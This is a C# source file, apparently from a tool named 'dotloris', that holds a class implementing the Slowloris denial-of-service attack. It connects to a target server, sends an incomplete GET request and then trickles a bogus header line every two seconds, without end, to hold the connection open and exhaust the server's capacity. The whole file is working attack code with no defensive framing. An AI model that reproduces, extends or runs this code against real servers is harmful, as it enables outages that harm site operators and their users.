using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace dotloris {

    class Slowloris {

        private static int SLOWLORIS_ATTACKS_COUNT = 0;

        private TcpClient client;

        public void Attack(IPAddress ip, int port, string requestHeader){
            
            //init tcp client
            client = new TcpClient();
            client.Client.Connect(ip, port);

            while(true){
                if(client.Connected) break;
            }

            Console.WriteLine("[Info]: Slowloris " + ++SLOWLORIS_ATTACKS_COUNT + " attack launched...");

            //send incomplete GET request
            client.Client.Send(getBytes(requestHeader));

            StartSendingHeaderChunks();
        }

        private Byte[] getBytes(string message)
            => System.Text.Encoding.ASCII.GetBytes(message);
        
        private async Task StartSendingHeaderChunks(){

            //send chunk headers... forever...
            while(true){
                client.Client.Send(getBytes("dotloris: dotloris\r\n"));

                await Task.Delay(2000);
            }
        }
    }
}